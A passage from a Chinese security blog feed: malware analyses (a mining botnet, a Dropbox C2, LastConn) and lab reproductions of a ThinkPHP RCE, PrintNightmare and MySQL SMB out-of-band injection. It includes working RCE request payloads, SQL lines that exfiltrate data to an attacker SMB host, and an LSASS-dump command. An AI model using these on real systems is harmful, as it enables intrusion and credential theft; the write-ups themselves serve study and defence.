    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd</a><br>PS：大部分二进制文件都是golang写的</p><p>攻击模块配置信息:<a href="http://m.windowsupdatesupport.org/d/windowsupdatev1.json" target="_blank" rel="noopener">http://m.windowsupdatesupport.org/d/windowsupdatev1.json</a><br><img src="https://i.bmp.ovh/imgs/2021/07/d40a5da968266f64.png" alt=""></p><h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><p>download - md5：423d3ade2f14572c5bd5f546973eb493<br>编写语言:VC++<br><img src="https://i.bmp.ovh/imgs/2021/07/853a3fc9e0eaf244.png" alt=""></p><p>如果加载crt运行库失败进入反调试判断<br>这玩意啥事没干，创建UID然后HOOK和设置窗口的<br><img src="https://i.bmp.ovh/imgs/2021/07/f119fe0052fb76b6.png" alt=""></p><p>沙箱全绿，啥危险动作也没有：<a href="https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719</a><br>定性为混淆视听用的 (一本正经胡说八道</p><h2 id="dbus和updater-exe"><a href="#dbus和updater-exe" class="headerlink" title="dbus和updater.exe"></a>dbus和updater.exe</h2><p>xmr挖矿<br><img src="https://i.bmp.ovh/imgs/2021/07/143f344b34ab9ea9.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2021/07/2b14c3fc76c5c4b9.png" alt=""></p><h2 id="sshkey-sh"><a href="#sshkey-sh" class="headerlink" title="sshkey.sh"></a>sshkey.sh</h2><p>杀死带有hashvault.pro,nanopool.org,minexmr.com,/boot/efi/,supportxmr.com,xmrpool.net,minergate.com,viaxmr.com,hwlh3wlh44lh,Circle_MI,get.bi-chi.com,hashvault.pro,nanopool.org,/usr/bin/.sshd,/usr/bin/bsd-port,xmr,xig,ddgs,qW3xT,wnTKYg,t00ls.ru,sustes,thisxxs,hashfish,kworkerds关键字的进程<br>从被沦陷的机器里收集ssh私钥、正在连接到当前机器的ssh IP、ssh port、非0.0.0.0和本机的IP、遍历尝试连接执行命令<br><img src="https://i.bmp.ovh/imgs/2021/07/95b307c837970d3b.png" alt=""></p><h2 id="loader-sh"><a href="#loader-sh" class="headerlink" title="loader.sh"></a>loader.sh</h2><p>loader.sh - md5:28d790d6a9172f3c59df117f00af7755<br>删除或杀死带有aegis,hids,cloudwalker,titanagent,edr,aegis,Yun,hids,edr,cloudwalker,titanagent,sgagent,barad_agent,hostguard关键字的进程/进程所在目录,创建.git目录,下载kworkers到.git目录里后台运行，删除带有m.windowsupdatesupport.org关键字的命令历史记录<br><img src="https://i.bmp.ovh/imgs/2021/07/714b29205612fc41.png" alt=""></p><h2 id="hideproc-sh"><a href="#hideproc-sh" class="headerlink" title="hideproc.sh"></a>hideproc.sh</h2><p>hideproc.sh - md5:27b704633d578c44fefffa2e3ac026ae<br>为了隐藏进程，如果当前权限是root权限，检查/etc/ld.so.preload是否存在关键字libc2.28，远程下载processhider.c编译好后移动至/usr/local/lib/<br><img src="https://i.bmp.ovh/imgs/2021/07/242284e33e57d303.png" alt=""></p><p>processhider用的github上开源的<br><a href="https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p><h2 id="loader-ps1"><a href="#loader-ps1" class="headerlink" title="loader.ps1"></a>loader.ps1</h2><p>loader.ps1 - md5:35429fa2dacf4f52188cfd59f994fd91<br>创建.git文件夹,检查当前目录下是否存在.git文件夹。如果存在附加隐藏属性，下载service到.git文件夹。如果当前目录不存在.git文件夹，就在C:\Windows\Temp文件夹，重复上面的步骤<br><img src="https://i.bmp.ovh/imgs/2021/07/413e938baccda7bb.png" alt=""></p><h2 id="service-exe"><a href="#service-exe" class="headerlink" title="service.exe"></a>service.exe</h2><p>service.exe - md5:b5e5cd56703fbda95accbb8528131da4<br>VT：<a href="https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection</a></p><blockquote><p>释放procedump尝试dump系统lsass.exe进程（procdump.exe -accepteula -ma lsass.exe C:*/1.dmp），再打包上传，其意图为通过dump LSASS进程，窃取内存数据，再结合其它方法（例如Mimikatz）以破解失陷系统的明文密码，以便进一步对失陷网络的其它计算机进行入侵渗透活动。</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2021/07/a0c67f1d34f97330.png" alt=""><br><img src="https://i.loli.net/2021/07/19/4mdgxGX2Yuc9b6r.png" alt=""></p><p>golang开发的<br><img src="https://i.loli.net/2021/07/19/c12ifCtaOjRVqwS.png" alt=""><br>找不到入口点（没见到main_main）<br>只能靠沙盒了</p><h2 id="autoupdate-exe"><a href="#autoupdate-exe" class="headerlink" title="autoupdate.exe"></a>autoupdate.exe</h2><p>autoupdate.exe - md5:93b797b32df3a0f15d1d9c78749aa918<br>加了UPX壳，同样是golang开发的<br><img src="https://i.loli.net/2021/07/19/SU2kBzhCrgMnYuw.png" alt=""><br><img src="https://i.loli.net/2021/07/19/DjU4mYeoWv1F5KA.png" alt=""></p><p>获取远程要攻击的IP段，和本地机器的IP段。进行web漏洞尝试<br><img src="https://i.loli.net/2021/07/19/3EZip2FucfI5dXB.png" alt=""><br><img src="https://i.loli.net/2021/07/19/gd3EPoMnG6pKWhc.png" alt=""></p><p>进行以下exp尝试</p><pre><code>* 用友bsh.servlet.BshServlet 命令执行攻击* 用友GRP-U8注入-命令执行攻击* 泛微OA E-cology Bsh 命令执行攻击* 致远OA htmlofficeservlet任意文件写入攻击* 致远OA-ajax.do文件上传漏洞攻击* 致远OA-fajson漏洞* Docker未授权命令执行攻击* Jenkins 未授权命令执行攻击* Tomcat 爆破攻击* Weblogic RCE远程执行攻击( CVE-2020-14882)* Spring boot actuator RCE* Shiro 反序列化 RCE* Struts2全系列（s008-s057）的漏洞利用攻击</code></pre><p>…….等等<br><img src="https://i.loli.net/2021/07/19/4ZSFob1LsVpYWHz.png" alt=""></p><h2 id="inj-exe"><a href="#inj-exe" class="headerlink" title="inj.exe"></a>inj.exe</h2><p>inj.exe - md5:46171ccf2302e01fa6cb0a97e081a885<br>进程注射器<br><img src="https://i.loli.net/2021/07/19/dME3pztrLhGv1Xb.png" alt=""></p><h2 id="runtime-dll"><a href="#runtime-dll" class="headerlink" title="runtime.dll"></a>runtime.dll</h2><p>runtime.dll - md5:c6cf950a65df9ebfaf78cfa86f6788db<br>对NtQuerySystemInfomation进行hook，最终实现Windows平台下的恶意模块进程的隐藏。<br><img src="https://i.loli.net/2021/07/19/lH6IMhnVkLUpDva.png" alt=""><br><img src="https://i.loli.net/2021/07/19/IyhkzO29oBLTYZ3.png" alt=""></p><p>URL :<a href="http://m.windowsupdatesupport.org" target="_blank" rel="noopener">http://m.windowsupdatesupport.org</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;amp;mi</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP3.2.x RCE漏洞复现</title>
    <link href="http://422926799.github.io/posts/94587123.html"/>
    <id>http://422926799.github.io/posts/94587123.html</id>
    <published>2021-07-12T09:32:20.000Z</published>
    <updated>2021-07-12T09:46:31.421Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/12/WiotOO.jpg" alt=""></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ThinkPHP3.2的远程代码执行漏洞。该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>windows 10phpstudy 5.6Thinkphp 3.2.3完整版</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>demo:</p><blockquote><p>demo代码说明：如果需要测试请把demo代码放入对应位置,代码位置：\Application\Home\Controller\IndexController.class.php,因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置：Application\Home\View\Index (View没有Index文件夹需要自己创建)</p></blockquote><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller {    public function index($value=&#39;&#39;){        $this-&gt;assign($value);        $this-&gt;display();    }}</code></pre><p>利用步骤：</p><pre><code>1. 创建log2. 包含log</code></pre><p>创建log发送请求 注意，m=后面的code不要url编码，否则包含的时候会失败）</p><pre><code>http://127.0.0.1/index.php?m=--&gt;&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/WiTLxP.png" alt=""></p><p>包含log</p><pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log</code></pre><p><img src="https://z3.ax1x.com/2021/07/12/Wi7eZF.png" alt=""></p><p>Debug开启和关闭的路径不同:</p><pre><code>开启: Application\Runtime\Logs\Common\&lt;log&gt;关闭: Application\Runtime\Logs\Home\&lt;log&gt;</code></pre><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>1.assign函数返回模板变量<br><img src="https://z3.ax1x.com/2021/07/12/Wi7GqO.png" alt=""></p><p>2.到display函数开始解析<br><img src="https://z3.ax1x.com/2021/07/12/Wi7NIH.png" alt=""></p><p>3.到达View.Class.php发现把payload传入到Hook::Listen函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7wRI.png" alt=""></p><p>4.进入循环在将payload传入self::exec函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7rsf.png" alt=""></p><p>5.调用Behavior\ParseTemplateBehavior类 (将log文件写入缓存php)<br><img src="https://z3.ax1x.com/2021/07/12/Wi7fWn.png" alt=""></p><p>6.调用fetch函数<br><img src="https://z3.ax1x.com/2021/07/12/Wi7IyV.png" alt=""></p><p>最后load函数加载<br><img src="https://z3.ax1x.com/2021/07/12/Wi77eU.png" alt=""></p><p>(不会描述，原文章描述的很好)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ</a><br><a href="https://blog.csdn.net/cvper/article/details/66713909" target="_blank" rel="noopener">https://blog.csdn.net/cvper/article/details/66713909</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/07/12/WiotOO.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Th</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>某Dropbox c2分析</title>
    <link href="http://422926799.github.io/posts/e5369ead.html"/>
    <id>http://422926799.github.io/posts/e5369ead.html</id>
    <published>2021-07-03T13:44:16.000Z</published>
    <updated>2021-07-03T14:47:08.374Z</updated>
    
    <content type="html"><![CDATA[<p>样本地址：<a href="https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/" target="_blank" rel="noopener">https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/</a><br>x86 C++编写<br><img src="https://z3.ax1x.com/2021/07/03/RRQwnA.png" alt=""></p><p>该样本是个释放器，用于释放Dropbox的c2<br><img src="https://z3.ax1x.com/2021/07/03/RRQoNV.png" alt=""></p><p>首先搜索当前进程所在路径下的doc、xls、pdf。后缀文件，这三个后缀文件如果搜索到一个则打开<br><img src="https://z3.ax1x.com/2021/07/03/RRQH9U.png" alt=""></p><p>然后休眠2秒<br><img src="https://z3.ax1x.com/2021/07/03/RR88DH.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRQLjJ.png" alt=""></p><p>在C:\Users\Public释放名为spools.exe，最后执行<br><img src="https://z3.ax1x.com/2021/07/03/RR8aPP.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8d8f.png" alt=""></p><p>火绒剑动态监控：<br><img src="https://z3.ax1x.com/2021/07/03/RR8w28.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8DKg.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RR8zse.png" alt=""></p><p>Dropbox c2分析<br>沙盒执行：<a href="https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c" target="_blank" rel="noopener">https://app.any.run/tasks/84bc039c-cefa-4369-b4ba-3ed1a254eb2c</a><br>注册一个窗口类调用sub_404F30函数<br><img src="https://z3.ax1x.com/2021/07/03/RRGFit.png" alt=""></p><p>该函数调用CreateThread创建线程执行<br><img src="https://z3.ax1x.com/2021/07/03/RRt2mF.png" alt=""></p><p>首先检查开机到现在启动的时间，如果该时间小于192000毫秒。则休眠102毫秒<br>然后获取计算机配置构造出要发送的json，进入死循环<br><img src="https://z3.ax1x.com/2021/07/03/RRtWTJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRt5f1.png" alt="计算机配置信息收集"></p><p>构造请求的json<br><img src="https://z3.ax1x.com/2021/07/03/RRtTl6.png" alt=""></p><p>v72+GetLocalTime最终拼接出来的json<br><img src="https://z3.ax1x.com/2021/07/03/RRNSpt.png" alt=""></p><p>IE请求构造<br><img src="https://z3.ax1x.com/2021/07/03/RRNF0g.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNn10.png" alt=""></p><p>在dropbox在给定的路径上创建一个文件夹<br><img src="https://z3.ax1x.com/2021/07/03/RRNucV.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNQnU.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNlBF.png" alt=""></p><p>获取远程的文件夹内容，获取后写入到C:\Users\Public\下的一个文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNt91.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNUc6.png" alt=""></p><p>然后下面上传了一个文件，这里没分析出来是上传了什么<br><img src="https://z3.ax1x.com/2021/07/03/RRNoNj.png" alt=""></p><p>最后远程下载要执行的命令写入到txt，执行完成后上传。最后删除下载的文件<br><img src="https://z3.ax1x.com/2021/07/03/RRNHCn.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRNXuT.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/03/RRUSUJ.png" alt=""></p><p>最后休眠102毫秒<br><img src="https://z3.ax1x.com/2021/07/03/RRUAKK.png" alt=""></p><p>IOC<br>释放器:0ee449ccbe2e7f413be85b627ca198ba<br>spools.exe md5:b6824c8cb1594e48a8f63d25066e1dde</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;样本地址：&lt;a href=&quot;https://app.any.run/tasks/2cb3412f-cc9e-4164-8f9d-28aba9e6d681/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://app.any.run/tasks/2</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-1675复现</title>
    <link href="http://422926799.github.io/posts/c257aa46.html"/>
    <id>http://422926799.github.io/posts/c257aa46.html</id>
    <published>2021-06-30T19:15:07.000Z</published>
    <updated>2021-06-30T19:28:26.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>Windows Print Spooler 远程代码执行漏洞<br>CVE-2021-1675<br>安全漏洞<br>发布时间：2021 年 6 月 8 日 最后更新：2021 年 6 月 21 日<br>分配 CNA：<br>微软<br>MITRE CVE-2021-1675<br>CVSS：3.0 7.8 / 6.8</p></blockquote><p>影响范围:Windows Server 2012-Windows Server 2019</p><p>官方链接:<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Windows Server 2019<br>域控版本:Windows Server 2016<br><img src="https://z3.ax1x.com/2021/07/01/RDr0QU.png" alt=""></p><p>需一个普通的域用户<br><img src="https://z3.ax1x.com/2021/07/01/RDrdzT.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目前有的exp一共有两个，一个是py的一个是cpp写的<br><a href="https://github.com/hayasec/PrintNightmare" target="_blank" rel="noopener">https://github.com/hayasec/PrintNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-1675</a></p><p>至于第二个py的，我这impacket环境报错<br><img src="https://z3.ax1x.com/2021/07/01/RDraWV.png" alt=""></p><p>第一个PrintNightmare下载下来后需要改两个地方，第112行的驱动路径UNIDRV.DLL，需要手动确定位置<br><img src="https://z3.ax1x.com/2021/07/01/RDrByF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrDL4.png" alt=""></p><p>搜索有关old关键词的路径，替换为<code>C:\\Windows\\System32\\spool\\drivers\\x64\\%s</code>，一共有3处<br><img src="https://z3.ax1x.com/2021/07/01/RDrseJ.png" alt=""></p><p>msf或cs生成个x64的dll（填的驱动路径是amd64对应64位），丢到smb。smb需要可以匿名访问/或者直接丢虚拟机里本地路径也行<br>执行即可成功上线cs<br><img src="https://z3.ax1x.com/2021/07/01/RDryw9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrgF1.png" alt=""></p><p>这里还顺便踩了smb的坑，用自带的smb服务，不要用imapcket的smbserver.py。否则会报句柄错误</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Windows Print Spooler 远程代码执行漏洞&lt;br&gt;CVE-2021-1675&lt;b</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>mysql smb外带注入</title>
    <link href="http://422926799.github.io/posts/af61cc76.html"/>
    <id>http://422926799.github.io/posts/af61cc76.html</id>
    <published>2021-06-29T14:19:23.000Z</published>
    <updated>2021-06-29T14:28:09.743Z</updated>
    
    <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;需求：secure_file_priv为空，目标系统为windows&lt;br&gt;smb设置如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：
map to guest = Bad </summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>LastConn 样本简陋分析</title>
    <link href="http://422926799.github.io/posts/519d2f5e.html"/>
    <id>http://422926799.github.io/posts/519d2f5e.html</id>
    <published>2021-06-19T17:35:48.000Z</published>
    <updated>2021-06-19T17:55:09.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" 